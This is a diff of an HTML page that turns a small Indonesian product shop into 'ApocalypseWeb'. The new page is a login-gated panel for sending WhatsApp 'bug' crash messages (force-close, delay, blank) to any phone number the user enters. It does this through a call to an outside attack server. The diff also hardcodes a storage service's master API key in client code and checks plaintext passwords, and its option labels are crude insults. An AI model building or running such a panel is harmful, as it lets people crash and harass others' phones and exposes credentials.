@@ -1,242 +1,324 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Hanzyy Produk</title>
-  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <title>ApocalypseWeb</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
   <style>
+    :root { --main: #ffffff; --second: #cccccc; --bg: #0e0e0e; --text: #eeeeee; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #0e0e0e url('https://i.ibb.co/r0pY3Lt/bg-particles.gif') center/cover no-repeat;
-      color: #fff;
-      padding: 20px;
+      background: var(--bg); color: var(--text);
+      min-height: 100vh; display: flex;
+      justify-content: center; align-items: center;
+      padding: 20px; position: relative;
     }
-    h1, h2 { text-align: center; color: #00ffc8; }
-    .box {
-      max-width: 800px;
-      margin: 20px auto;
-      background: rgba(255,255,255,0.05);
-      padding: 20px;
+    #particles-js { position: fixed; width: 100%; height: 100%; z-index: 0; }
+    .glass-box {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 30px; backdrop-filter: blur(10px);
+      box-shadow: 0 0 25px rgba(255, 255, 255, 0.2);
+      z-index: 2; max-width: 450px; width: 100%;
+    }
+    .profile { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
+    .profile img { width: 65px; height: 65px; border-radius: 50%; border: 2px solid var(--main); }
+    .profile-info h2 { font-size: 1.2rem; color: var(--main); }
+    .status { font-size: 0.9rem; color: #bbbbbb; }
+    .status i { color: #ffffff; margin-right: 5px; }
+    h1 { font-size: 1.4rem; color: var(--main); margin-bottom: 20px; text-align: center; animation: neon 2s infinite alternate; }
+    .neon {
+  color: #0ff;
+  text-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 20px #0ff;
+  animation: flicker 1.5s infinite alternate;
+}
+
+@keyframes flicker {
+  0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+    opacity: 1;
+  }
+  20%, 24%, 55% {
+    opacity: 0.4;
+  }
+}
+    @keyframes neon { from { text-shadow: 0 0 10px var(--main); } to { text-shadow: 0 0 25px var(--second); } }
+    input {
+      background: rgba(255, 255, 255, 0.05);
+      color: white;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
+      padding: 12px;
+      width: 100%;
+      margin-bottom: 10px;
+      transition: 0.3s;
+    }
+    input:focus {
+      outline: none; border: 1px solid var(--main);
+      background: rgba(255, 255, 255, 0.1);
+    }
+    .bug-options { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+    .bug-card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
       border-radius: 15px;
-      box-shadow: 0 0 20px #00ffc833;
+      padding: 12px 20px;
+      display: flex; align-items: center;
+      gap: 10px; cursor: pointer; transition: 0.3s;
     }
-    .produk-item, .keranjang-item {
-      background: rgba(255,255,255,0.05);
-      padding: 10px;
-      margin: 8px 0;
-      border-radius: 10px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .btn {
-      padding: 6px 12px;
-      background: #00ffc8;
-      color: #000;
+    .bug-card i { font-size: 1.2rem; color: #ffffff; }
+    .bug-card span { font-size: 1rem; color: white; }
+    .bug-card:hover { background: rgba(255, 255, 255, 0.1); transform: scale(1.03); }
+    .bug-card.active { border: 2px solid var(--main); box-shadow: 0 0 12px var(--main); }
+    button {
+      background: linear-gradient(135deg, var(--main), var(--second));
       border: none;
-      border-radius: 8px;
+      color: blue;
+      width: 100%;
+      padding: 14px;
+      border-radius: 50px;
+      font-size: 1rem;
       cursor: pointer;
-      font-weight: bold;
-      margin-left: 5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 0 15px var(--main);
+      transition: 0.3s;
+      margin-top: 10px;
     }
-    .btn:hover { opacity: 0.85; }
-    input[type="date"], input[type="text"] {
-      padding: 10px;
-      margin: 5px;
-      border-radius: 8px;
-      border: none;
-      width: 45%;
+    .small-logout {
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid var(--main);
+      color: var(--main);
+      font-size: 0.85rem;
+      padding: 8px 16px;
+      border-radius: 12px;
+      margin-top: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+      width: fit-content;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
     }
-    #namaUser, #namaTampil {
-      text-align: center;
-      color: #00ffc8;
+    .small-logout:hover {
+      background: rgba(255, 255, 255, 0.2);
     }
-    canvas { background: #1a1a1a; border-radius: 15px; padding: 10px; }
+    #popup {
+  position: fixed;
+  top: 0; left: 0; width: 100%; height: 100%;
+  background: rgba(0, 0, 0, 0.6);
+  display: flex; justify-content: center; align-items: center;
+  z-index: 999;
+}
+.popup-content {
+  background: #1a1a1a;
+  color: #00ff88;
+  padding: 30px;
+  border-radius: 15px;
+  text-align: center;
+  max-width: 90%;
+  box-shadow: 0 0 20px #00ff88;
+  animation: fadeIn 0.3s ease-in-out;
+  position: relative;
+}
+
+.popup-content .close-btn {
+  position: absolute;
+  top: 10px; right: 15px;
+  font-size: 1.5rem;
+  color: #ff4d4d;
+  cursor: pointer;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: scale(0.9); }
+  to { opacity: 1; transform: scale(1); }
+}
   </style>
 </head>
 <body>
-
-<div class="box" id="loginBox">
-  <h2>Masukkan Nama Anda</h2>
-  <input type="text" id="namaUser" placeholder="Nama Anda" />
-  <button class="btn" onclick="login()">Masuk</button>
+<div id="particles-js"></div>
+<div id="popup" style="display:none;">
+  <div class="popup-content">
+    <span class="close-btn" onclick="closePopup()">&times;</span>
+    <p id="popup-message"></p>
+  </div>
 </div>
 
-<div class="box" id="produkBox" style="display:none;">
-  <h2>Selamat datang, <span id="namaTampil"></span> 👋</h2>
-  <h3>Daftar Produk</h3>
-  <div id="produkList"></div>
-  <hr/>
-  <h3>Keranjang</h3>
-  <div id="keranjangList"></div>
-  <div id="diskonInfo"></div>
-  <button class="btn" onclick="checkout()">Checkout via WhatsApp</button>
+<div id="login-box" class="glass-box">
+  <h2>Welcome To Server Xzut</h2>
+  
+  <input type="text" id="username" placeholder="Username" />
+  <input type="text"id="password" placeholder="Password"/>
+  <button onclick="login()"><i class="fas fa-sign-in-alt"></i>masuk</button>
+  <div id="login-result" style="margin-top:10px; text-align:center;"></div>
 </div>
 
-<div class="box" id="statistikBox" style="display:none;">
-  <h2>📊 Statistik Penjualan</h2>
-  <input type="date" id="fromDate" />
-  <input type="date" id="toDate" />
-  <button class="btn" onclick="filterStatistik()">Tampilkan</button>
-  <canvas id="chartPenjualan" height="120"></canvas>
+<div class="glass-box" id="main-box" style="display:none;">
+  <div class="profile">
+    <img src="https://files.catbox.moe/oeqk8v.png" alt="profile">
+    <div class="profile-info">
+      <h2 id="userLabel">Api Bug</h2>
+      <span class="status"><i class="fas fa-circle"></i> Connected</span>
+    </div>
+  </div>
+  <h1 class="neon"><i class="fab fa-whatsapp"></i> Apocalypse</h1>
+  <input type="text" id="target" placeholder="628xxxx" />
+<div class="bug-options">
+  <div class="bug-card active" data-bug="crashtotal">
+    <i class="fas fa-skull-crossbones"></i><span>FC Invisible</span>
+  </div>
+  <div class="bug-card" data-bug="fc">
+    <i class="fas fa-bomb"></i><span>kontol WA</span>
+  </div>
+  <div class="bug-card" data-bug="delay">
+    <i class="fas fa-clock"></i><span>bangke Delay</span>
+  </div>
+  <div class="bug-card" data-bug="blank">
+    <i class="fas fa-eye-slash"></i><span>mmk WhatsApp</span>
+  </div>
+  <button id="sendBtn" onclick="sendBug()"><i class="fas fa-bug"></i> Kirim Bug</button>
+  <button class="small-logout" onclick="logout()">Logout</button>
+
+  <div id="result" style="margin-top:10px;"></div>
+  <div class="contact" style="margin-top: 20px; color: white;">
+    <p>Contact Developer:</p>
+    <a href="https://t.me/leakvjs" target="_blank" style="color: #00acee; text-decoration: none;">
+      <i class="fab fa-telegram"></i> @axpaw O`vovTzmxv
+    </a>
+  </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
 <script>
-const produk = [
-  { nama: "Script WA Bot", harga: 50000 },
-  { nama: "Panel Pembayaran", harga: 75000 },
-  { nama: "Obfuscator JS", harga: 60000 },
-  { nama: "Panel Produk", harga: 45000 }
-];
-let keranjang = [];
-let namaUser = '';
-
-function login() {
-  const nama = document.getElementById("namaUser").value.trim();
-  if (!nama) return alert("Nama wajib diisi");
-  namaUser = nama;
-  document.getElementById("namaTampil").innerText = nama;
-  document.getElementById("loginBox").style.display = "none";
-  document.getElementById("produkBox").style.display = "block";
-  document.getElementById("statistikBox").style.display = "block";
-  renderProduk();
-}
-
-function renderProduk() {
-  const list = document.getElementById("produkList");
-  list.innerHTML = "";
-  produk.forEach((p, i) => {
-    const el = document.createElement("div");
-    el.className = "produk-item";
-    el.innerHTML = `
-      <span>${p.nama} - Rp${p.harga.toLocaleString()}</span>
-      <div>
-        <button class="btn" onclick="tambahKeranjang(${i})">+ Keranjang</button>
-        <button class="btn" style="background: #00c851;" onclick="beliLangsung(${i})">Beli</button>
-      </div>
-    `;
-    list.appendChild(el);
-  });
-  renderKeranjang();
-}
-
-function tambahKeranjang(i) {
-  keranjang.push(produk[i]);
-  renderKeranjang();
-  playClick();
-}
-
-function renderKeranjang() {
-  const wrap = document.getElementById("keranjangList");
-  wrap.innerHTML = "";
-  let total = 0;
-  keranjang.forEach((item, index) => {
-    total += item.harga;
-    const el = document.createElement("div");
-    el.className = "keranjang-item";
-    el.innerHTML = `
-      ${item.nama} - Rp${item.harga.toLocaleString()}
-      <button onclick="hapusItem(${index})" style="color:red;">X</button>
-    `;
-    wrap.appendChild(el);
-  });
-
-  let diskon = total >= 100000 ? total * 0.1 : 0;
-  document.getElementById("diskonInfo").innerHTML = `
-    <p>Total: <b>Rp${total.toLocaleString()}</b></p>
-    <p>Diskon: <b>Rp${diskon.toLocaleString()}</b></p>
-    <p><b>Total Bayar: Rp${(total - diskon).toLocaleString()}</b></p>
-  `;
-}
-
-function hapusItem(i) {
-  keranjang.splice(i, 1);
-  renderKeranjang();
-}
-
-function checkout() {
-  if (keranjang.length === 0) return alert("Keranjang kosong!");
-  playClick(); audioSuccess.play();
-  let pesan = `Halo saya ${namaUser}, saya ingin membeli:\n\n`;
-  let total = 0;
-  keranjang.forEach((p, i) => {
-    pesan += `- ${p.nama} = Rp${p.harga.toLocaleString()}\n`;
-    total += p.harga;
-  });
-  let diskon = total >= 100000 ? total * 0.1 : 0;
-  let bayar = total - diskon;
-  pesan += `\nTotal: Rp${total.toLocaleString()}`;
-  if (diskon > 0) pesan += `\nDiskon: Rp${diskon.toLocaleString()}`;
-  pesan += `\nTotal Bayar: Rp${bayar.toLocaleString()}`;
-  showPopupSukses("✅ Checkout berhasil. Mengarah ke WhatsApp...");
-  const url = "https://wa.me/6288989566141?text=" + encodeURIComponent(pesan);
-  setTimeout(() => { window.open(url, '_blank'); }, 800);
-}
-
-function beliLangsung(i) {
-  playClick(); audioSuccess.play();
-  const produkItem = produk[i];
-  const pesan = `Halo saya ${namaUser}, saya ingin membeli:\n\n` +
-                `- ${produkItem.nama} = Rp${produkItem.harga.toLocaleString()}\n\n` +
-                `Total: Rp${produkItem.harga.toLocaleString()}`;
-  showPopupSukses("✅ Berhasil mengarahkan ke WhatsApp...");
-  const url = "https://wa.me/6288989566141?text=" + encodeURIComponent(pesan);
-  setTimeout(() => { window.open(url, '_blank'); }, 800);
-}
-
-function playClick() {
-  audioClick.currentTime = 0;
-  audioClick.play();
-  if (navigator.vibrate) navigator.vibrate(100);
-}
-
-function showPopupSukses(pesan) {
-  const div = document.createElement("div");
-  div.innerText = pesan;
-  div.style.position = "fixed";
-  div.style.top = "20px";
-  div.style.right = "20px";
-  div.style.padding = "15px 20px";
-  div.style.background = "#00c851";
-  div.style.color = "#fff";
-  div.style.fontWeight = "bold";
-  div.style.borderRadius = "10px";
-  div.style.boxShadow = "0 0 10px rgba(0,0,0,0.3)";
-  div.style.zIndex = "9999";
-  document.body.appendChild(div);
-  setTimeout(() => div.remove(), 3000);
-}
-
-// Grafik statistik
-const dataPenjualan = [...Array(30)].map((_, i) => {
-  const d = new Date(2025, 6, i+1);
-  const tgl = d.toISOString().split("T")[0];
-  return { tanggal: tgl, total: Math.floor(Math.random() * 150000) + 10000 };
+particlesJS("particles-js", {
+  particles: {
+    number: { value: 60, density: { enable: true, value_area: 800 }},
+    color: { value: "#ffffff" },
+    shape: { type: "circle" },
+    opacity: { value: 0.4 },
+    size: { value: 3, random: true },
+    line_linked: {
+      enable: true, distance: 150,
+      color: "#ffffff", opacity: 0.3, width: 1
+    },
+    move: { enable: true, speed: 2, direction: "none", random: false }
+  },
+  interactivity: {
+    events: {
+      onhover: { enable: true, mode: "grab" },
+      onclick: { enable: false }
+    },
+    modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
+  },
+  retina_detect: true
 });
 
-function filterStatistik() {
-  const from = document.getElementById("fromDate").value;
-  const to = document.getElementById("toDate").value;
-  if (!from || !to) return alert("Pilih rentang tanggal!");
-  const filtered = dataPenjualan.filter(d => d.tanggal >= from && d.tanggal <= to);
-  const labels = filtered.map(d => d.tanggal);
-  const values = filtered.map(d => d.total);
-  const ctx = document.getElementById("chartPenjualan").getContext("2d");
-  if (window.penjualanChart) window.penjualanChart.destroy();
-  window.penjualanChart = new Chart(ctx, {
-    type: 'bar',
-    data: {
-      labels: labels,
-      datasets: [{ label: 'Total Penjualan', backgroundColor: '#00ffccaa', data: values }]
-    },
-    options: { responsive: true, scales: { y: { beginAtZero: true } } }
-  });
+const BIN_ID = "686ba9fa8a456b7966bcc574";
+const API_KEY = "$2a$10$MPw.J50xKE.i.HBKKPWYieKzmUQYvM/4hLOy3cYHSFcVEL8Yo08W";
+const headers = {
+  "Content-Type": "application/json",
+  "X-Master-Key": API_KEY
+};
+
+async function getUsers() {
+  const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
+  const data = await res.json();
+  return data.record;
 }
 
-const audioClick = new Audio("https://assets.mixkit.co/sfx/preview/mixkit-select-click-1109.mp3");
-const audioSuccess = new Audio("https://assets.mixkit.co/sfx/preview/mixkit-achievement-bell-600.mp3");
+function logout() {
+  sessionStorage.removeItem("currentUser");
+  location.reload();
+}
+
+function saveSession(user) {
+  sessionStorage.setItem("currentUser", JSON.stringify(user));
+}
+
+function getSession() {
+  return JSON.parse(sessionStorage.getItem("currentUser"));
+}
+
+window.onload = async () => {
+  const user = getSession();
+  if (user) showDashboard(user);
+};
+
+function showPopup(message) {
+  document.getElementById("popup-message").innerHTML = message;
+  document.getElementById("popup").style.display = "flex";
+}
+
+function closePopup() {
+  document.getElementById("popup").style.display = "none";
+}
+
+async function login() {
+  const user = document.getElementById("username").value.trim();
+  const pass = document.getElementById("password").value.trim();
+  const result = document.getElementById("login-result");
+  const users = await getUsers();
+  const found = users.find(u => u.username === user && u.password === pass);
+
+  if (found) {
+    saveSession(found);
+    showDashboard(found);
+  } else {
+    result.innerText = "❌ Username atau Password salah!";
+    result.style.color = "crimson";
+  }
+}
+
+function showDashboard(user) {
+  document.getElementById("login-box").style.display = "none";
+  document.getElementById("main-box").style.display = "block";
+  document.getElementById("userLabel").innerText = user.username;
+}
+
+let selectedBug = "crashtotal";
+document.querySelectorAll(".bug-card").forEach(card => {
+  card.addEventListener("click", () => {
+    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
+    card.classList.add("active");
+    selectedBug = card.getAttribute("data-bug");
+  });
+});
+
+async function sendBug() {
+  const input = document.getElementById("target").value.trim();
+  const resDiv = document.getElementById("result");
+  const btn = document.getElementById("sendBtn");
+
+  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {
+    resDiv.innerText = "Masukkan nomor WA yang valid!";
+    resDiv.style.color = "crimson";
+    return;
+  }
+
+  const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
+  btn.disabled = true;
+  const originalHTML = btn.innerHTML;
+  btn.innerHTML = '<span class="spinner"></span> Mengirim...';
+  resDiv.innerText = "";
+
+try {
+  const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
+  const json = await res.json();
+
+  showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);
+} catch (err) {
+  resDiv.innerText = "❌ Gagal fetch: " + err;
+  resDiv.style.color = "crimson";
+}
+
+  btn.disabled = false;
+  btn.innerHTML = originalHTML;
+}
 </script>
 </body>
 </html>
